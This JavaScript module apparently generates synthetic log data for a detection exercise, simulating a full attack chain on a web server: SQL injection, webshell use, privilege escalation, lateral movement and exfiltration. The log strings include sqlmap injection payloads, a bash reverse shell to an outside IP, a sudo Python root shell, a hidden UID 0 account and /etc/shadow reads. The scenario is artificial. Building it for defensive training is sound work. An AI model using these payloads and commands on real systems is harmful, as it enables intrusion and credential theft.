'use strict';

const { syslogTs, ago, addSeconds } = require('../../utils/time');

// Case 10: Multi-Stage Attack — Full Kill Chain
// Stage 1: SQL injection on login form -> data dump
// Stage 2: Webshell upload -> RCE
// Stage 3: Privilege escalation via sudo
// Stage 4: Lateral movement to internal hosts
// Stage 5: Exfiltration to 185.220.101.55

function generate() {
  const base = new Date();
  base.setHours(22, 0, 0, 0);

  const ATTACKER    = '185.220.101.55';
  const WEB_HOST    = 'web-app-01';
  const DB_HOST     = 'db-server-02';
  const ADMIN_HOST  = 'mgmt-server-01';
  const WEB_IP      = '10.0.0.90';
  const DB_IP       = '10.0.0.91';

  const webEvents   = [];
  const authEvents  = [];
  const auditEvents = [];
  const dbEvents    = [];
  const fwEvents    = [];

  // ════════════════════════════════════════════════════════
  // STAGE 1: Initial Access — SQL Injection (22:00–22:08)
  // ════════════════════════════════════════════════════════

  // Reconnaissance — scanning for SQLi
  let t = new Date(base);
  webEvents.push(`${ATTACKER} - - [${t.toUTCString()}] "GET /login.php?user=admin&pass=test HTTP/1.1" 200 1843 "-" "sqlmap/1.7.8"`);
  t = addSeconds(t, 2);
  webEvents.push(`${ATTACKER} - - [${t.toUTCString()}] "GET /login.php?user=admin'-- HTTP/1.1" 500 12 "-" "sqlmap/1.7.8"`);
  t = addSeconds(t, 1);
  webEvents.push(`${ATTACKER} - - [${t.toUTCString()}] "GET /login.php?user=admin'+OR+'1'='1 HTTP/1.1" 200 5234 "-" "sqlmap/1.7.8"`);
  t = addSeconds(t, 2);
  webEvents.push(`${ATTACKER} - - [${t.toUTCString()}] "GET /login.php?user=1+UNION+SELECT+username,password,3+FROM+users-- HTTP/1.1" 200 8823 "-" "sqlmap/1.7.8"`);
  t = addSeconds(t, 3);
  // Data dump
  webEvents.push(`${ATTACKER} - - [${t.toUTCString()}] "GET /login.php?user=1+UNION+SELECT+table_name,2,3+FROM+information_schema.tables-- HTTP/1.1" 200 31204 "-" "sqlmap/1.7.8"`);
  t = addSeconds(t, 4);
  webEvents.push(`${ATTACKER} - - [${t.toUTCString()}] "GET /login.php?user=1+UNION+SELECT+username,password,email+FROM+users-- HTTP/1.1" 200 48829 "-" "sqlmap/1.7.8"`);

  // DB logs showing injection queries
  t = addSeconds(base, 8);
  dbEvents.push(`${syslogTs(t)} ${DB_HOST} mysqld: [Warning] Unsafe statement written to the binary log using statement format`);
  t = addSeconds(t, 1);
  dbEvents.push(`${syslogTs(t)} ${DB_HOST} mysqld: Query  SELECT username,password,email FROM users`);
  t = addSeconds(t, 1);
  dbEvents.push(`${syslogTs(t)} ${DB_HOST} mysqld: Query  SELECT table_name FROM information_schema.tables WHERE table_schema='webapp'`);

  // ════════════════════════════════════════════════════════
  // STAGE 2: Execution + Persistence — Webshell Upload (22:10–22:15)
  // ════════════════════════════════════════════════════════

  t = addSeconds(base, 600);
  webEvents.push(`${ATTACKER} - - [${t.toUTCString()}] "POST /admin/upload.php HTTP/1.1" 200 38 "http://${WEB_HOST}/admin/" "Mozilla/5.0"`);
  t = addSeconds(t, 5);
  webEvents.push(`${ATTACKER} - - [${t.toUTCString()}] "GET /uploads/image.php.jpg?cmd=id HTTP/1.1" 200 32 "-" "curl/7.68.0"`);
  t = addSeconds(t, 2);
  webEvents.push(`${ATTACKER} - - [${t.toUTCString()}] "GET /uploads/image.php.jpg?cmd=whoami HTTP/1.1" 200 9 "-" "curl/7.68.0"`);
  t = addSeconds(t, 3);
  webEvents.push(`${ATTACKER} - - [${t.toUTCString()}] "GET /uploads/image.php.jpg?cmd=uname+-a HTTP/1.1" 200 89 "-" "curl/7.68.0"`);
  t = addSeconds(t, 2);
  webEvents.push(`${ATTACKER} - - [${t.toUTCString()}] "POST /uploads/image.php.jpg HTTP/1.1" 200 0 "-" "curl/7.68.0"`);

  // Webshell executes reverse shell
  t = addSeconds(base, 720);
  auditEvents.push(`${syslogTs(t)} ${WEB_HOST} kernel: audit: type=EXECVE msg=audit(...): argc=3 a0="/bin/bash" a1="-c" a2="bash -i >& /dev/tcp/${ATTACKER}/4443 0>&1"`);
  auditEvents.push(`${syslogTs(t)} ${WEB_HOST} kernel: audit: type=SYSCALL msg=audit(...): uid=33 auid=33 pid=15001 ppid=15000 comm="php" exe="/usr/bin/php"`);

  // ════════════════════════════════════════════════════════
  // STAGE 3: Privilege Escalation (22:20–22:25)
  // ════════════════════════════════════════════════════════

  t = addSeconds(base, 1200);
  authEvents.push(`${syslogTs(t)} ${WEB_HOST} sudo[15100]: www-data : TTY=pts/3 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/python3 -c import os;os.system('/bin/bash')`);
  t = addSeconds(t, 3);
  auditEvents.push(`${syslogTs(t)} ${WEB_HOST} kernel: audit: type=SYSCALL msg=audit(...): uid=0 pid=15110 comm="bash" exe="/bin/bash"`);
  t = addSeconds(t, 5);
  auditEvents.push(`${syslogTs(t)} ${WEB_HOST} kernel: audit: type=PATH msg=audit(...): name="/etc/shadow" inode=1048 mode=0640 ouid=0 ogid=42`);
  t = addSeconds(t, 2);
  authEvents.push(`${syslogTs(t)} ${WEB_HOST} passwd[15120]: password changed for backdoor_svc`);
  authEvents.push(`${syslogTs(t)} ${WEB_HOST} useradd[15121]: new user: name=backdoor_svc, UID=0, GID=0, home=/root`);

  // SSH key installation
  t = addSeconds(t, 5);
  auditEvents.push(`${syslogTs(t)} ${WEB_HOST} kernel: audit: type=PATH msg=audit(...): name="/root/.ssh/authorized_keys" inode=20481 mode=0600 ouid=0`);

  // ════════════════════════════════════════════════════════
  // STAGE 4: Lateral Movement (22:30–22:50)
  // ════════════════════════════════════════════════════════

  t = addSeconds(base, 1800);
  authEvents.push(`${syslogTs(t)} ${DB_HOST} sshd[16100]: Accepted publickey for backdoor_svc from ${WEB_IP} port 44321 ssh2`);
  t = addSeconds(t, 2);
  authEvents.push(`${syslogTs(t)} ${DB_HOST} sshd[16100]: pam_unix(sshd:session): session opened for user backdoor_svc by (uid=0)`);
  t = addSeconds(t, 20);
  dbEvents.push(`${syslogTs(t)} ${DB_HOST} mysqld: [Note] Connect: root@localhost on`);
  t = addSeconds(t, 3);
  dbEvents.push(`${syslogTs(t)} ${DB_HOST} mysqld: Query  SHOW DATABASES`);
  t = addSeconds(t, 2);
  dbEvents.push(`${syslogTs(t)} ${DB_HOST} mysqld: Query  SELECT * FROM customers`);

  // Pivot to admin server
  t = addSeconds(base, 2700);
  authEvents.push(`${syslogTs(t)} ${ADMIN_HOST} sshd[17200]: Accepted publickey for backdoor_svc from ${DB_IP} port 55600 ssh2`);
  t = addSeconds(t, 5);
  auditEvents.push(`${syslogTs(t)} ${ADMIN_HOST} kernel: audit: type=SYSCALL msg=audit(...): uid=0 pid=17210 comm="cat" exe="/bin/cat" a0="/etc/shadow"`);

  // ════════════════════════════════════════════════════════
  // STAGE 5: Exfiltration (23:00–23:45)
  // ════════════════════════════════════════════════════════

  t = addSeconds(base, 3600);
  const EXFIL_BYTES = 2147483648; // 2GB
  const FLOWS = 90;
  const BYTES_PER_FLOW = Math.floor(EXFIL_BYTES / FLOWS);
  let exfilT = new Date(t);
  for (let i = 0; i < FLOWS; i++) {
    const bytes = BYTES_PER_FLOW + Math.floor(Math.random() * 100000 - 50000);
    fwEvents.push(`${syslogTs(exfilT)} fw-core-01 kernel: iptables: IN= OUT=eth0 SRC=${DB_IP} DST=${ATTACKER} LEN=${bytes} TTL=64 PROTO=TCP SPT=50001 DPT=443 ACK PSH`);
    exfilT = addSeconds(exfilT, 30);
  }

  // ── Normal background traffic ─────────────────────────────────────────────────
  const normalUsers = ['appuser', 'monitor', 'backup', 'deploy'];
  let bgT = ago(base, { hours: 4 });
  while (bgT < addSeconds(base, 7200)) {
    const u   = normalUsers[Math.floor(Math.random() * normalUsers.length)];
    const ip  = `10.0.0.${10 + Math.floor(Math.random() * 20)}`;
    authEvents.push(`${syslogTs(bgT)} ${WEB_HOST} sshd[${7000 + Math.floor(Math.random() * 500)}]: Accepted password for ${u} from ${ip} port ${49000 + Math.floor(Math.random() * 5000)} ssh2`);
    bgT = addSeconds(bgT, 300 + Math.floor(Math.random() * 600));
  }

  webEvents.sort();
  authEvents.sort();
  auditEvents.sort();
  dbEvents.sort();
  fwEvents.sort();

  return [
    { events: webEvents,   sourcetype: 'apache',  host: WEB_HOST   },
    { events: authEvents,  sourcetype: 'auth',    host: WEB_HOST   },
    { events: auditEvents, sourcetype: 'audit',   host: WEB_HOST   },
    { events: dbEvents,    sourcetype: 'mysql',   host: DB_HOST     },
    { events: fwEvents,    sourcetype: 'firewall', host: 'fw-core-01' },
  ];
}

module.exports = { generate };
